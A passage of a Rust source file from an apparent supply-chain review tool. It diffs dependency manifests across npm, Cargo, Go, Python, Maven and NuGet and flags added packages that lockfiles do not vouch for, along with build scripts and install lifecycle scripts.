//! package.json dependency drift. Agents add, swap, and hallucinate packages —
//! the top supply-chain risk in agent-written changes ("slopsquatting"). This
//! renders the dependency and script sections of package.json as drift nodes
//! and flags additions that the lockfile can't vouch for. Heuristic, like every
//! other rule: a prompt to verify, not a verdict.
use std::collections::{BTreeMap, BTreeSet, HashSet};
use std::path::Path;

use crate::diff::assign_ids;
use crate::model::{AstNode, FileEntry, Flag, NodeState, Severity};
use crate::session::FileResult;

const DEP_SECTIONS: [&str; 4] = [
    "dependencies",
    "devDependencies",
    "peerDependencies",
    "optionalDependencies",
];

/// Lockfiles the dependency analysis reads, npm first (matches the read order
/// below). The watcher full-scans when any of these change — phantom-dep flags
/// depend on lockfile content, not just package.json.
pub const LOCKFILE_NAMES: [&str; 3] = ["package-lock.json", "yarn.lock", "pnpm-lock.yaml"];

/// Names a lockfile can vouch for, or `None` when the repo has no lockfile.
pub fn lockfile_names(root: &Path) -> Option<LockfileNames> {
    let npm = root.join(LOCKFILE_NAMES[0]);
    if let Ok(text) = std::fs::read_to_string(&npm) {
        return Some(LockfileNames::Npm(npm_lock_names(&text)));
    }
    for name in &LOCKFILE_NAMES[1..] {
        if let Ok(text) = std::fs::read_to_string(root.join(name)) {
            let parsed = if *name == "yarn.lock" {
                yarn_lock_names(&text)
            } else {
                pnpm_lock_names(&text)
            };
            // A lockfile with content the parser doesn't recognize falls back
            // to the loose text check — a false "present" is safer than a
            // false alarm against an unknown format revision.
            if parsed.is_empty() && !text.trim().is_empty() {
                return Some(LockfileNames::Text(text));
            }
            return Some(LockfileNames::Parsed(parsed));
        }
    }
    None
}

pub enum LockfileNames {
    /// package-lock.json parsed into the set of installed package names.
    Npm(HashSet<String>),
    /// yarn.lock / pnpm-lock.yaml entry headers parsed into package names —
    /// exact matching, so `left-pad` in the lockfile cannot vouch for a
    /// hallucinated `pad`.
    Parsed(HashSet<String>),
    /// Fallback for unrecognized lockfile content: checked as text
    /// (`name@` occurs) — loose on purpose; a false "present" is safer
    /// than a false alarm.
    Text(String),
}

impl LockfileNames {
    fn contains(&self, name: &str) -> bool {
        match self {
            LockfileNames::Npm(set) | LockfileNames::Parsed(set) => set.contains(name),
            LockfileNames::Text(text) => text.contains(&format!("{name}@")),
        }
    }
}

/// Entry names from a yarn lockfile (classic v1 and berry). Entry headers are
/// the non-indented, non-comment lines ending with `:`, holding one or more
/// quoted descriptors like `"@scope/pkg@^1.0.0", "@scope/pkg@npm:^1.2.0":` —
/// the package name is everything before the `@` that starts the range
/// (skipping a scope's leading `@`).
fn yarn_lock_names(text: &str) -> HashSet<String> {
    let mut names = HashSet::new();
    for line in text.lines() {
        if line.starts_with([' ', '\t']) || line.starts_with('#') {
            continue;
        }
        let Some(entry) = line.trim_end().strip_suffix(':') else {
            continue;
        };
        for descriptor in entry.split(',') {
            let d = descriptor.trim().trim_matches('"');
            if d.is_empty() {
                continue;
            }
            let version_at = d
                .char_indices()
                .skip(1) // a scope's leading @ is part of the name
                .find(|(_, c)| *c == '@')
                .map(|(i, _)| i);
            let name = version_at.map_or(d, |i| &d[..i]);
            if !name.is_empty() {
                names.insert(name.to_string());
            }
        }
    }
    names
}

/// Entry names from `pnpm-lock.yaml`'s `packages:` section across lockfile
/// revisions: v5 `/name/1.0.0:`, v6 `/name@1.0.0:`, v9 `name@1.0.0:`, each
/// optionally quoted (scoped packages keep their leading `@`).
fn pnpm_lock_names(text: &str) -> HashSet<String> {
    let mut names = HashSet::new();
    let mut in_packages = false;
    for line in text.lines() {
        if line.trim().is_empty() {
            continue; // blank lines don't end a YAML section
        }
        if !line.starts_with(' ') {
            in_packages = line.trim_end() == "packages:";
            continue;
        }
        if !in_packages {
            continue;
        }
        let trimmed = line.trim_start();
        if line.len() - trimmed.len() != 2 {
            continue; // entry keys sit at indent 2; their fields sit deeper
        }
        let Some(key) = trimmed.trim_end().strip_suffix(':') else {
            continue;
        };
        if let Some(name) = pnpm_entry_name(key) {
            names.insert(name);
        }
    }
    names
}

fn pnpm_entry_name(key: &str) -> Option<String> {
    let key = key.trim_matches(|c| c == '"' || c == '\'');
    let key = key.strip_prefix('/').unwrap_or(key);
    if let Some(rest) = key.strip_prefix('@') {
        // @scope/name@ver (v6/v9) or @scope/name/ver (v5)
        let slash = rest.find('/')?;
        let tail = &rest[slash + 1..];
        let end = tail
            .find(['@', '/'])
            .map_or(rest.len(), |i| slash + 1 + i);
        Some(format!("@{}", &rest[..end]))
    } else {
        let end = key.find(['@', '/']).unwrap_or(key.len());
        if end == 0 {
            return None;
        }
        Some(key[..end].to_string())
    }
}

fn npm_lock_names(text: &str) -> HashSet<String> {
    let mut names = HashSet::new();
    let Ok(json) = serde_json::from_str::<serde_json::Value>(text) else {
        return names;
    };
    // v2/v3: "packages" keyed by "node_modules/<name>" (possibly nested).
    if let Some(packages) = json.get("packages").and_then(|v| v.as_object()) {
        for key in packages.keys() {
            if let Some(idx) = key.rfind("node_modules/") {
                names.insert(key[idx + "node_modules/".len()..].to_string());
            }
        }
    }
    // v1 fallback: top-level "dependencies" keys.
    if let Some(deps) = json.get("dependencies").and_then(|v| v.as_object()) {
        names.extend(deps.keys().cloned());
    }
    names
}

type Entries = BTreeMap<String, String>;

// ---------------------------------------------------------------------------
// Other ecosystems (v0.5.0). Each mirrors the package.json UX: dependency
// entries become drift nodes; a canonical lockfile (when present) downgrades a
// "not vouched" High to a "new dependency" Medium/Low. Where an ecosystem has
// NO canonical lockfile, additions flag at Low as "new dependency" with honest
// wording — never an accusation the tool can't back.
// ---------------------------------------------------------------------------

/// Exact-match set of dependency names a lockfile vouches for. Unlike the npm
/// `LockfileNames`, these formats are line-oriented; an empty set means "no
/// lockfile present" and the caller flags new deps at Low instead of High.
pub struct VouchedNames(HashSet<String>);

impl VouchedNames {
    fn contains(&self, name: &str) -> bool {
        self.0.contains(name)
    }
}

/// Manifest names whose dependency analysis the watcher / router recognizes,
/// paired with their lockfile (empty when the ecosystem has none).
///
/// Watcher note: these manifest/lockfile names are NOT listed in the watcher's
/// `classify_paths` full-scan triggers (unlike `package.json` / `LOCKFILE_NAMES`).
/// They don't need to be: none are git-`is_analyzable` source paths, so every one
/// of them already lands in `classify_paths`'s non-analyzable catch-all, which
/// forces a full scan. Keeping them out of an explicit list avoids duplicating
/// `LOCKFILE_NAMES` (which is npm-vouching-specific) with a second meaning.
pub const CARGO_MANIFEST: &str = "Cargo.toml";
pub const CARGO_LOCK: &str = "Cargo.lock";
pub const GO_MANIFEST: &str = "go.mod";
pub const GO_LOCK: &str = "go.sum";
pub const REQUIREMENTS_TXT: &str = "requirements.txt";
pub const PYPROJECT_TOML: &str = "pyproject.toml";
pub const POETRY_LOCK: &str = "poetry.lock";

/// `Cargo.lock` package names (`[[package]] name = "..."`). Exact matching, so a
/// real `serde` entry cannot vouch for a hallucinated `serde-helper`.
pub fn cargo_lock_names(text: &str) -> VouchedNames {
    let mut names = HashSet::new();
    let Ok(value) = text.parse::<toml::Value>() else {
        return VouchedNames(names);
    };
    if let Some(pkgs) = value.get("package").and_then(|p| p.as_array()) {
        for pkg in pkgs {
            if let Some(name) = pkg.get("name").and_then(|n| n.as_str()) {
                names.insert(name.to_string());
            }
        }
    }
    VouchedNames(names)
}

/// `go.sum` module paths. Each line is `module version hash`; we take the module
/// path (first field), ignoring the `/go.mod` hash-line duplicates.
pub fn go_sum_names(text: &str) -> VouchedNames {
    let mut names = HashSet::new();
    for line in text.lines() {
        if let Some(module) = line.split_whitespace().next() {
            if !module.is_empty() {
                names.insert(module.to_string());
            }
        }
    }
    VouchedNames(names)
}

/// `poetry.lock` package names (`[[package]] name = "..."`, TOML like Cargo).
pub fn poetry_lock_names(text: &str) -> VouchedNames {
    cargo_lock_names(text)
}

/// Read a Cargo/Go/Poetry lockfile from disk if present.
pub fn vouched_names(root: &Path, lock_name: &str) -> Option<VouchedNames> {
    let text = std::fs::read_to_string(root.join(lock_name)).ok()?;
    Some(match lock_name {
        CARGO_LOCK => cargo_lock_names(&text),
        GO_LOCK => go_sum_names(&text),
        POETRY_LOCK => poetry_lock_names(&text),
        _ => return None,
    })
}

/// A `Cargo.toml` dependency value is either a version string or a table with a
/// `version`/`git`/`path` key. Render the most useful one-line spec.
fn cargo_dep_spec(value: &toml::Value) -> String {
    match value {
        toml::Value::String(s) => s.clone(),
        toml::Value::Table(t) => {
            // A path/workspace dep resolves inside this repo or workspace — no
            // registry lookup, so no slopsquatting vector. Render those markers
            // first (and unconditionally, even alongside a `version` key) so the
            // rule can recognize and downgrade them.
            if let Some(p) = t.get("path").and_then(|v| v.as_str()) {
                format!("path: {p}")
            } else if t.get("workspace").and_then(|v| v.as_bool()) == Some(true) {
                "workspace".to_string()
            } else if let Some(v) = t.get("version").and_then(|v| v.as_str()) {
                v.to_string()
            } else if let Some(g) = t.get("git").and_then(|v| v.as_str()) {
                format!("git: {g}")
            } else {
                "(table)".to_string()
            }
        }
        other => other.to_string(),
    }
}

/// Collect a `[dependencies]`-style table from a Cargo manifest into entries.
fn cargo_section(value: &toml::Value, path: &[&str]) -> Entries {
    let mut cur = value;
    for key in path {
        match cur.get(key) {
            Some(v) => cur = v,
            None => return Entries::new(),
        }
    }
    cur.as_table()
        .map(|t| {
            t.iter()
                .map(|(k, v)| (k.clone(), cargo_dep_spec(v)))
                .collect()
        })
        .unwrap_or_default()
}

/// Every dependency section in a Cargo manifest, including per-target tables
/// (`[target.'cfg(...)'.dependencies]`), merged into one entry map per kind.
fn cargo_all_sections(value: &toml::Value) -> Vec<(String, Entries)> {
    let mut out: Vec<(String, Entries)> = Vec::new();
    for kind in ["dependencies", "dev-dependencies", "build-dependencies"] {
        let mut entries = cargo_section(value, &[kind]);
        // Merge target-specific tables of the same kind so a phantom dep hidden
        // under [target.'cfg(windows)'.dependencies] still surfaces.
        if let Some(targets) = value.get("target").and_then(|t| t.as_table()) {
            for (_target, table) in targets {
                for (k, v) in cargo_section(table, &[kind]) {
                    entries.entry(k).or_insert(v);
                }
            }
        }
        if !entries.is_empty() {
            out.push((kind.to_string(), entries));
        }
    }
    out
}

/// Diff `Cargo.toml` dependency sections plus the `[package] build = "..."`
/// custom build-script path (the Cargo analog of an npm install script).
pub fn analyze_cargo_toml(
    before: Option<&str>,
    after: Option<&str>,
    lockfile: Option<&VouchedNames>,
) -> Option<FileResult> {
    let parse = |s: Option<&str>| s.and_then(|t| t.parse::<toml::Value>().ok());
    let b = parse(before);
    let a = parse(after);
    let empty = toml::Value::Table(Default::default());
    let b = b.as_ref().unwrap_or(&empty);
    let a = a.as_ref().unwrap_or(&empty);

    let mut nodes: Vec<AstNode> = Vec::new();
    let mut pending: Vec<(usize, &'static str, String)> = Vec::new();

    let before_sections: BTreeMap<String, Entries> = cargo_all_sections(b).into_iter().collect();
    let after_sections: BTreeMap<String, Entries> = cargo_all_sections(a).into_iter().collect();
    let kinds: BTreeSet<&String> = before_sections.keys().chain(after_sections.keys()).collect();
    let empty_entries = Entries::new();
    for kind in kinds {
        pending.extend(diff_entries(
            before_sections.get(kind).unwrap_or(&empty_entries),
            after_sections.get(kind).unwrap_or(&empty_entries),
            kind,
            "Dependency",
            &mut nodes,
            |state, name, old, new| cargo_go_rule(state, name, old, new, kind, lockfile),
        ));
    }

    // [package] build = "build.rs" — a custom build script runs arbitrary code
    // at compile time, like a postinstall. Flag additions and path changes.
    let build_before = cargo_build_script(b);
    let build_after = cargo_build_script(a);
    if build_before != build_after {
        if let Some(after_path) = &build_after {
            let mut map_b = Entries::new();
            let mut map_a = Entries::new();
            if let Some(bp) = &build_before {
                map_b.insert("build".into(), bp.clone());
            }
            map_a.insert("build".into(), after_path.clone());
            pending.extend(diff_entries(
                &map_b,
                &map_a,
                "package",
                "Build script",
                &mut nodes,
                |state, _name, _old, new| match state {
                    NodeState::Added | NodeState::Modified => Some((
                        "cargo-build-script",
                        format!(
                            "Cargo build script set to \u{201c}{new}\u{201d} — build scripts run arbitrary code at compile time."
                        ),
                    )),
                    _ => None,
                },
            ));
        }
    }

    build_result("cargo_toml", "Cargo.toml", "TOML", nodes, pending, |rule| match rule {
        "dep-not-in-lockfile" => (Severity::High, "Dependency not in lockfile"),
        "dep-added" => (Severity::Medium, "New dependency"),
        "dep-added-local" => (Severity::Low, "Local dependency added"),
        "dep-changed" => (Severity::Low, "Dependency version changed"),
        "cargo-build-script" => (Severity::Medium, "Build script changed"),
        _ => (Severity::Low, "Dependency"),
    })
}

fn cargo_build_script(value: &toml::Value) -> Option<String> {
    value
        .get("package")
        .and_then(|p| p.get("build"))
        .and_then(|b| b.as_str())
        .map(str::to_string)
}

/// Shared add/modify rule for the lockfile-vouching ecosystems (Cargo, Go,
/// Poetry-locked Python). With a lockfile, an unvouched add is High; without
/// one, every add is a Low "new dependency".
fn cargo_go_rule(
    state: NodeState,
    name: &str,
    old: &str,
    new: &str,
    sec: &str,
    lockfile: Option<&VouchedNames>,
) -> Option<(&'static str, String)> {
    // A Cargo path/workspace dependency resolves within this repo or workspace
    // — no registry fetch, so the slopsquatting/hallucination accusation does
    // not apply. Downgrade an add to Low regardless of lockfile state.
    if state == NodeState::Added && (new.starts_with("path: ") || new == "workspace") {
        let where_ = if new == "workspace" {
            "inherited from the workspace".to_string()
        } else {
            format!("resolved from {new}")
        };
        return Some((
            "dep-added-local",
            format!(
                "Local dependency \u{201c}{name}\u{201d} ({where_}) — a workspace-local crate, not a registry package."
            ),
        ));
    }
    match state {
        NodeState::Added => match lockfile {
            Some(lock) if !lock.contains(name) => Some((
                "dep-not-in-lockfile",
                format!(
                    "\u{201c}{name}\u{201d} was added to {sec} but isn't in the lockfile — confirm the package exists and was installed intentionally. Hallucinated package names are a known agent risk."
                ),
            )),
            Some(_) => Some((
                "dep-added",
                format!("New dependency \u{201c}{name}\u{201d} ({new}) — verify it's intended and vetted."),
            )),
            None => Some((
                "dep-added-nolock",
                format!("New dependency \u{201c}{name}\u{201d} ({new}) — no lockfile to vouch for it; verify it's intended and vetted."),
            )),
        },
        NodeState::Modified => Some((
            "dep-changed",
            format!("\u{201c}{name}\u{201d} version changed {old} → {new} — confirm the bump is intentional."),
        )),
        _ => None,
    }
}

/// Module paths and versions from a `require` directive in `go.mod`, both the
/// block form (`require (\n  path v1.2.3\n)`) and single-line `require path ver`.
/// `indirect` collects the module paths carrying a `// indirect` marker —
/// transitive entries `go mod tidy` writes into the graph, distinct from a
/// dependency the developer chose directly.
fn go_mod_requires(text: &str) -> (Entries, BTreeSet<String>) {
    let mut entries = Entries::new();
    let mut indirect = BTreeSet::new();
    let mut in_block = false;
    for raw in text.lines() {
        let (code, comment) = match raw.split_once("//") {
            Some((c, rest)) => (c.trim(), rest.trim()),
            None => (raw.trim(), ""),
        };
        let is_indirect = comment == "indirect" || comment.starts_with("indirect");
        if code.is_empty() {
            continue;
        }
        if in_block {
            if code == ")" {
                in_block = false;
                continue;
            }
            insert_go_require(&mut entries, &mut indirect, code, is_indirect);
        } else if code == "require (" {
            in_block = true;
        } else if let Some(rest) = code.strip_prefix("require ") {
            insert_go_require(&mut entries, &mut indirect, rest.trim(), is_indirect);
        }
    }
    (entries, indirect)
}

fn insert_go_require(
    entries: &mut Entries,
    indirect: &mut BTreeSet<String>,
    line: &str,
    is_indirect: bool,
) {
    let mut parts = line.split_whitespace();
    if let (Some(path), Some(ver)) = (parts.next(), parts.next()) {
        entries.insert(path.to_string(), ver.to_string());
        if is_indirect {
            indirect.insert(path.to_string());
        }
    }
}

/// Diff `go.mod` require directives. `go.sum` (when present) vouches; without it,
/// additions are Low new-dependency flags.
pub fn analyze_go_mod(
    before: Option<&str>,
    after: Option<&str>,
    lockfile: Option<&VouchedNames>,
) -> Option<FileResult> {
    let (before_reqs, _) = before.map(go_mod_requires).unwrap_or_default();
    let (after_reqs, after_indirect) = after.map(go_mod_requires).unwrap_or_default();

    let mut nodes: Vec<AstNode> = Vec::new();
    let pending = diff_entries(
        &before_reqs,
        &after_reqs,
        "require",
        "Module",
        &mut nodes,
        |state, name, old, new| {
            // `// indirect` requires are transitive entries the module graph
            // pulls in (and go.sum vouches for) — `go mod tidy` adds them in
            // bulk. They aren't a developer-chosen direct dependency, so an
            // added indirect require is Low, not the Medium "you chose this".
            if state == NodeState::Added && after_indirect.contains(name) {
                return Some((
                    "dep-added-indirect",
                    format!(
                        "Indirect dependency \u{201c}{name}\u{201d} ({new}) added by the module graph — a transitive requirement, not a direct choice."
                    ),
                ));
            }
            cargo_go_rule(state, name, old, new, "require", lockfile)
        },
    );

    build_result("go_mod", "go.mod", "Go", nodes, pending, |rule| match rule {
        "dep-not-in-lockfile" => (Severity::High, "Dependency not in lockfile"),
        "dep-added" => (Severity::Medium, "New dependency"),
        "dep-added-indirect" => (Severity::Low, "Indirect dependency added"),
        "dep-changed" => (Severity::Low, "Dependency version changed"),
        _ => (Severity::Low, "New dependency"),
    })
}

/// Parse a `requirements.txt` line into (name, full-spec). Skips comments,
/// blank lines, `-r`/`-c` includes, options (`--hash=`), and editable/URL
/// installs we can't attribute to a simple package name.
fn requirement_entry(line: &str) -> Option<(String, String)> {
    let line = line.split('#').next().unwrap_or("").trim();
    if line.is_empty() || line.starts_with('-') {
        return None;
    }
    // PEP 508 environment markers (`; python_version < "3.12"`) gate *where* a
    // package installs, not which package or version. A marker-only edit leaves
    // the name + version constraint identical, so drop everything from the
    // first `;` before forming the comparison spec — otherwise a marker bump
    // (e.g. `< "3.12"` → `< "3.13"`) falsely reads as a version change.
    let spec = line.split(';').next().unwrap_or(line).trim().to_string();
    let end = line
        .find(['=', '<', '>', '~', '!', ' ', '[', ';', '@'])
        .unwrap_or(line.len());
    let name = line[..end].trim().to_lowercase();
    if name.is_empty() {
        return None;
    }
    Some((name, spec))
}

fn requirements(text: &str) -> Entries {
    text.lines().filter_map(requirement_entry).collect()
}

/// Diff `requirements.txt`. Python's lock story is fragmented and this file is
/// itself often the "lock"; we make no lockfile claim — additions are Low
/// "new dependency" flags with honest wording.
pub fn analyze_requirements_txt(before: Option<&str>, after: Option<&str>) -> Option<FileResult> {
    let before_reqs = before.map(requirements).unwrap_or_default();
    let after_reqs = after.map(requirements).unwrap_or_default();

    let mut nodes: Vec<AstNode> = Vec::new();
    let pending = diff_entries(
        &before_reqs,
        &after_reqs,
        "requirements",
        "Dependency",
        &mut nodes,
        no_lock_rule,
    );

    build_result("requirements_txt", "requirements.txt", "Python", nodes, pending, |rule| match rule {
        "dep-changed" => (Severity::Low, "Dependency version changed"),
        _ => (Severity::Low, "New dependency"),
    })
}

/// Dependency entries from `pyproject.toml`: PEP 621 `[project] dependencies`
/// (and `optional-dependencies`) plus `[tool.poetry.dependencies]`.
fn pyproject_sections(value: &toml::Value) -> Vec<(String, Entries)> {
    let mut out: Vec<(String, Entries)> = Vec::new();

    // PEP 621: project.dependencies is an array of PEP 508 requirement strings.
    if let Some(arr) = value
        .get("project")
        .and_then(|p| p.get("dependencies"))
        .and_then(|d| d.as_array())
    {
        let mut entries = Entries::new();
        for item in arr {
            if let Some(s) = item.as_str() {
                if let Some((name, spec)) = requirement_entry(s) {
                    entries.insert(name, spec);
                }
            }
        }
        if !entries.is_empty() {
            out.push(("project.dependencies".to_string(), entries));
        }
    }

    // Poetry: [tool.poetry.dependencies] is a table name -> version/constraint.
    if let Some(table) = value
        .get("tool")
        .and_then(|t| t.get("poetry"))
        .and_then(|p| p.get("dependencies"))
        .and_then(|d| d.as_table())
    {
        let mut entries = Entries::new();
        for (name, v) in table {
            if name == "python" {
                continue; // the interpreter constraint isn't a package
            }
            entries.insert(name.to_lowercase(), cargo_dep_spec(v));
        }
        if !entries.is_empty() {
            out.push(("tool.poetry.dependencies".to_string(), entries));
        }
    }
    out
}

/// Diff `pyproject.toml` dependency declarations. Vouches against `poetry.lock`
/// when present (High for unvouched adds); otherwise Low "new dependency".
pub fn analyze_pyproject_toml(
    before: Option<&str>,
    after: Option<&str>,
    lockfile: Option<&VouchedNames>,
) -> Option<FileResult> {
    let parse = |s: Option<&str>| s.and_then(|t| t.parse::<toml::Value>().ok());
    let b = parse(before);
    let a = parse(after);
    let empty = toml::Value::Table(Default::default());
    let b = b.as_ref().unwrap_or(&empty);
    let a = a.as_ref().unwrap_or(&empty);

    let before_sections: BTreeMap<String, Entries> = pyproject_sections(b).into_iter().collect();
    let after_sections: BTreeMap<String, Entries> = pyproject_sections(a).into_iter().collect();
    let kinds: BTreeSet<&String> = before_sections.keys().chain(after_sections.keys()).collect();
    let empty_entries = Entries::new();

    let mut nodes: Vec<AstNode> = Vec::new();
    let mut pending: Vec<(usize, &'static str, String)> = Vec::new();
    for kind in kinds {
        pending.extend(diff_entries(
            before_sections.get(kind).unwrap_or(&empty_entries),
            after_sections.get(kind).unwrap_or(&empty_entries),
            kind,
            "Dependency",
            &mut nodes,
            |state, name, old, new| match lockfile {
                Some(_) => cargo_go_rule(state, name, old, new, kind, lockfile),
                None => no_lock_rule(state, name, old, new),
            },
        ));
    }

    build_result("pyproject_toml", "pyproject.toml", "TOML", nodes, pending, |rule| match rule {
        "dep-not-in-lockfile" => (Severity::High, "Dependency not in lockfile"),
        "dep-added" => (Severity::Medium, "New dependency"),
        "dep-changed" => (Severity::Low, "Dependency version changed"),
        _ => (Severity::Low, "New dependency"),
    })
}

/// No-canonical-lockfile rule: every add is a Low "new dependency" (honest
/// wording, no accusation); version bumps are Low "version changed".
fn no_lock_rule(
    state: NodeState,
    name: &str,
    old: &str,
    new: &str,
) -> Option<(&'static str, String)> {
    match state {
        NodeState::Added => Some((
            "dep-added-nolock",
            format!("New dependency \u{201c}{name}\u{201d} ({new}) — no lockfile to vouch for it; verify it's intended and vetted."),
        )),
        NodeState::Modified => Some((
            "dep-changed",
            format!("\u{201c}{name}\u{201d} version changed {old} → {new} — confirm the bump is intentional."),
        )),
        _ => None,
    }
}

/// Maven `<dependency>` coordinates from a `pom.xml`, keyed `groupId:artifactId`
/// with the `<version>` (or `(managed)` when omitted) as the spec. Maven has no
/// canonical lockfile, so this only powers Low "new dependency" flags.
fn pom_dependencies(text: &str) -> Entries {
    use quick_xml::events::Event;
    use quick_xml::Reader;
    let mut reader = Reader::from_str(text);
    reader.config_mut().trim_text(true);

    let mut entries = Entries::new();
    let mut stack: Vec<String> = Vec::new();
    let (mut group, mut artifact, mut version) = (None, None, None);
    let mut in_dep = false;
    let mut text_for: Option<&'static str> = None;

    loop {
        match reader.read_event() {
            Ok(Event::Start(e)) => {
                let name = String::from_utf8_lossy(e.name().as_ref()).to_string();
                if name == "dependency"
                    && stack.last().map(String::as_str) == Some("dependencies")
                {
                    in_dep = true;
                    group = None;
                    artifact = None;
                    version = None;
                }
                if in_dep && stack.last().map(String::as_str) == Some("dependency") {
                    text_for = match name.as_str() {
                        "groupId" => Some("groupId"),
                        "artifactId" => Some("artifactId"),
                        "version" => Some("version"),
                        _ => None,
                    };
                }
                stack.push(name);
            }
            Ok(Event::Text(t)) => {
                if let Some(field) = text_for {
                    let value = t.unescape().unwrap_or_default().trim().to_string();
                    match field {
                        "groupId" => group = Some(value),
                        "artifactId" => artifact = Some(value),
                        "version" => version = Some(value),
                        _ => {}
                    }
                }
                text_for = None;
            }
            Ok(Event::End(e)) => {
                let name = String::from_utf8_lossy(e.name().as_ref()).to_string();
                text_for = None;
                if name == "dependency" && in_dep {
                    if let (Some(g), Some(a)) = (&group, &artifact) {
                        let spec = version.clone().unwrap_or_else(|| "(managed)".to_string());
                        entries.insert(format!("{g}:{a}"), spec);
                    }
                    in_dep = false;
                }
                stack.pop();
            }
            Ok(Event::Eof) | Err(_) => break,
            _ => {}
        }
    }
    entries
}

/// Diff Maven `pom.xml` dependencies. Maven has no canonical lockfile, so this
/// emits Low "new dependency" flags only — never a lockfile accusation.
pub fn analyze_pom_xml(before: Option<&str>, after: Option<&str>) -> Option<FileResult> {
    let before_deps = before.map(pom_dependencies).unwrap_or_default();
    let after_deps = after.map(pom_dependencies).unwrap_or_default();

    let mut nodes: Vec<AstNode> = Vec::new();
    let pending = diff_entries(
        &before_deps,
        &after_deps,
        "dependencies",
        "Dependency",
        &mut nodes,
        no_lock_rule,
    );

    build_result("pom_xml", "pom.xml", "XML", nodes, pending, |rule| match rule {
        "dep-changed" => (Severity::Low, "Dependency version changed"),
        _ => (Severity::Low, "New dependency"),
    })
}

/// `<PackageReference Include="..." Version="..."/>` entries from a `.csproj`.
/// Version may be an attribute or a nested `<Version>` child element.
fn csproj_packages(text: &str) -> Entries {
    use quick_xml::events::Event;
    use quick_xml::Reader;
    let mut reader = Reader::from_str(text);
    reader.config_mut().trim_text(true);

    let mut entries = Entries::new();
    // Track an open PackageReference whose version arrives as a child element.
    let mut pending_name: Option<String> = None;
    let mut pending_version: Option<String> = None;
    let mut in_version_child = false;

    let read_attrs = |e: &quick_xml::events::BytesStart| {
        let (mut name, mut version) = (None, None);
        for attr in e.attributes().flatten() {
            let key = String::from_utf8_lossy(attr.key.as_ref()).to_string();
            let val = attr.unescape_value().unwrap_or_default().to_string();
            match key.as_str() {
                "Include" => name = Some(val),
                "Version" => version = Some(val),
                _ => {}
            }
        }
        (name, version)
    };

    loop {
        match reader.read_event() {
            Ok(Event::Empty(e)) => {
                if e.name().as_ref() == b"PackageReference" {
                    let (name, version) = read_attrs(&e);
                    if let Some(n) = name {
                        entries.insert(n, version.unwrap_or_else(|| "(unspecified)".to_string()));
                    }
                }
            }
            Ok(Event::Start(e)) => match e.name().as_ref() {
                b"PackageReference" => {
                    let (name, version) = read_attrs(&e);
                    pending_name = name;
                    pending_version = version;
                }
                b"Version" if pending_name.is_some() => in_version_child = true,
                _ => {}
            },
            Ok(Event::Text(t)) => {
                if in_version_child {
                    pending_version = Some(t.unescape().unwrap_or_default().trim().to_string());
                }
            }
            Ok(Event::End(e)) => match e.name().as_ref() {
                b"Version" => in_version_child = false,
                b"PackageReference" => {
                    if let Some(n) = pending_name.take() {
                        entries.insert(
                            n,
                            pending_version.take().unwrap_or_else(|| "(unspecified)".to_string()),
                        );
                    }
                    pending_version = None;
                }
                _ => {}
            },
            Ok(Event::Eof) | Err(_) => break,
            _ => {}
        }
    }
    entries
}

/// `packages.lock.json` (NuGet) dependency names, when the repo opts into it.
pub fn nuget_lock_names(text: &str) -> VouchedNames {
    let mut names = HashSet::new();
    if let Ok(json) = serde_json::from_str::<serde_json::Value>(text) {
        if let Some(frameworks) = json.get("dependencies").and_then(|d| d.as_object()) {
            for (_tfm, deps) in frameworks {
                if let Some(obj) = deps.as_object() {
                    for name in obj.keys() {
                        names.insert(name.clone());
                    }
                }
            }
        }
    }
    VouchedNames(names)
}

/// Read `packages.lock.json` next to a csproj, if present.
pub fn nuget_lock(root: &Path) -> Option<VouchedNames> {
    let text = std::fs::read_to_string(root.join("packages.lock.json")).ok()?;
    Some(nuget_lock_names(&text))
}

/// Diff NuGet `<PackageReference>` entries in a `.csproj`. `packages.lock.json`
/// (when the repo enables lock files) vouches; otherwise Low "new dependency".
/// `file_path` is the repo-relative csproj path so multi-project repos localize.
pub fn analyze_csproj(
    file_path: &str,
    before: Option<&str>,
    after: Option<&str>,
    lockfile: Option<&VouchedNames>,
) -> Option<FileResult> {
    let before_pkgs = before.map(csproj_packages).unwrap_or_default();
    let after_pkgs = after.map(csproj_packages).unwrap_or_default();

    let mut nodes: Vec<AstNode> = Vec::new();
    let pending = diff_entries(
        &before_pkgs,
        &after_pkgs,
        "PackageReference",
        "Dependency",
        &mut nodes,
        |state, name, old, new| match lockfile {
            Some(_) => cargo_go_rule(state, name, old, new, "PackageReference", lockfile),
            None => no_lock_rule(state, name, old, new),
        },
    );

    let file_id = format!("csproj:{file_path}");
    build_result(&file_id, file_path, "XML", nodes, pending, |rule| match rule {
        "dep-not-in-lockfile" => (Severity::High, "Dependency not in lockfile"),
        "dep-added" => (Severity::Medium, "New dependency"),
        "dep-changed" => (Severity::Low, "Dependency version changed"),
        _ => (Severity::Low, "New dependency"),
    })
}

/// npm lifecycle scripts that run automatically during `npm install` (directly
/// or via a `pre`/`post` pairing). A change to one of these executes without an
/// explicit invocation — the supply-chain surface worth the sterner wording.
fn is_npm_lifecycle_script(name: &str) -> bool {
    const INSTALL_LIFECYCLE: [&str; 6] = [
        "preinstall",
        "install",
        "postinstall",
        "prepare",
        "prepublish",
        "prepublishOnly",
    ];
    INSTALL_LIFECYCLE.contains(&name)
}

fn section(json: &serde_json::Value, key: &str) -> Entries {
    json.get(key)
        .and_then(|v| v.as_object())
        .map(|obj| {
            obj.iter()
                .map(|(k, v)| (k.clone(), v.as_str().unwrap_or_default().to_string()))
                .collect()
        })
        .unwrap_or_default()
}

/// Diff the dependency + script sections of package.json. `None` when nothing
/// in those sections changed (other field churn isn't dependency drift).
pub fn analyze_package_json(
    before: Option<&str>,
    after: Option<&str>,
    lockfile: Option<&LockfileNames>,
) -> Option<FileResult> {
    let parse = |s: Option<&str>| -> serde_json::Value {
        s.and_then(|t| serde_json::from_str(t).ok())
            .unwrap_or(serde_json::Value::Null)
    };
    let b = parse(before);
    let a = parse(after);

    let mut nodes: Vec<AstNode> = Vec::new();
    let mut pending: Vec<(usize, &'static str, String)> = Vec::new(); // (node idx, rule, desc)

    for sec in DEP_SECTIONS {
        pending.extend(diff_entries(
            &section(&b, sec),
            &section(&a, sec),
            sec,
            "Dependency",
            &mut nodes,
            |state, name, old, new| match state {
                NodeState::Added => match lockfile {
                    Some(lock) if !lock.contains(name) => Some((
                        "dep-not-in-lockfile",
                        format!(
                            "\u{201c}{name}\u{201d} was added to {sec} but isn't in the lockfile — confirm the package exists and was installed intentionally. Hallucinated package names are a known agent risk."
                        ),
                    )),
                    _ => Some((
                        "dep-added",
                        format!("New dependency \u{201c}{name}\u{201d} ({new}) — verify it's intended and vetted."),
                    )),
                },
